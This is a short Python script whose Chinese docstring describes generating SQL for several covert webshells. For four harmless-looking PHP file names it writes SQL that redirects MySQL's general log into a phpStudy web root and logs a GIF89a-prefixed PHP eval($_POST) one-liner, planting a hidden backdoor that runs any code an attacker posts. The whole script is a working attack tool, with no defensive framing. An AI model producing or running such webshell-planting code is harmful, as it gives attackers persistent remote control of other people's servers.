#!/usr/bin/env python3
"""gen_shells.py - 生成多个隐蔽webshell的SQL"""
shell_body = "<?php @eval($_POST[\"x\"]);echo \"OK\";?>"

for name in ['check_sys.php', 'data_cache.php', 'mod_css.php', 'css_data.php']:
    sql = []
    sql.append("SET GLOBAL general_log = OFF;")
    sql.append("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/%s';" % name)
    sql.append("SET GLOBAL general_log = ON;")
    sql.append("SELECT 'GIF89a%s//'" % shell_body)
    sql.append("SET GLOBAL general_log = OFF;")
    with open('/tmp/shell_%s.sql' % name, 'w') as f:
        f.write('\n'.join(sql) + '\n')
    print('SQL ready:', name)
